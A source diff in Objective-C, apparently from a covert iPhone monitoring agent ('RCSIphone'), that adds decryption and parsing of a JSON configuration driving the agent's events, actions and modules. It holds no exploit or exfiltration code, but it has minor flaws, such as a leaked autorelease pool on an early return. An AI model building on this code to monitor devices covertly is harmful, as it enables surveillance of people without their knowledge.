@@ -18,7 +18,13 @@
 #import "RCSICommon.h"
 #import "RCSIUtils.h"
 
-//#define DEBUG_VERBOSE_1
+#define JSON_CONFIG
+
+#ifdef JSON_CONFIG
+#import "RCSIJSonConfiguration.h"
+#endif
+
+#define DEBUG_
 
 #pragma mark -
 #pragma mark Configurator Struct Definition
@@ -400,15 +406,22 @@ typedef struct _eventConf {
   NSData *configuration;
   
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
-  
+ 
+#ifdef JSON_CONFIG
+  configuration = [mEncryption decryptJSonConfiguration: configurationFile];
+#else
   configuration = [mEncryption decryptConfiguration: configurationFile];
-  
+#endif
+
   if (configuration == nil) 
   {
     [pool release];
     return NO;
   }
   
+#ifdef JSON_CONFIG
+  rVal = YES;
+#else  
   [configuration getBytes: &endOfConfData
                     range: NSMakeRange(TIMESTAMP_SIZE, sizeof(int))];
   
@@ -428,25 +441,43 @@ typedef struct _eventConf {
     rVal = NO;
 
   [pool release];
+#endif  
   
   return rVal;
 }
 
 - (BOOL)loadConfiguration
 {
-  NSString *configurationFile;
+  NSString *configurationFile = gConfigurationName;
   
-#ifdef DEV_MODE      
-  //configurationFile = @"/private/var/mobile/RCSIphone/conf_iphone.bin";
-  configurationFile = gConfigurationName;
-#else    
-  configurationFile = gConfigurationName;
-#endif
+#ifdef JSON_CONFIG
+  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
   
-#ifdef DEBUG
-   NSLog(@"loadConfiguration: configurationFile %@", configurationFile);
-#endif
+  RCSITaskManager *taskManager = [RCSITaskManager sharedInstance];
   
+  NSData *configuration = [mEncryption decryptJSonConfiguration: configurationFile];
+
+  if (configuration == nil)
+      return NO;
+
+  // For safety we remove all the previous objects
+  [taskManager removeAllElements];
+
+  SBJSonConfigDelegate *jSonDel = [[SBJSonConfigDelegate alloc] init];
+  
+  // Running the parser and populate the lists
+  BOOL bRet =
+  [jSonDel runParser: configuration 
+          WithEvents: [taskManager mEventsList] 
+          andActions: [taskManager mActionsList] 
+          andModules: [taskManager mAgentsList]];
+  
+  [jSonDel release];
+  [pool release];
+  
+  return bRet;
+  
+#else 
   int numberOfOccurrences;
   
   //
@@ -462,6 +493,7 @@ typedef struct _eventConf {
       // For safety we remove all the previous objects
       //
       [taskManager removeAllElements];
+      
 #ifdef DEBUG_VERBOSE_1
       [configuration writeToFile: @"/tmp/conf_decrypted.bin"
                       atomically: YES];
@@ -604,7 +636,9 @@ typedef struct _eventConf {
       
       return NO;
     }
-  
+
+#endif
+ 
   return YES;
 }
 
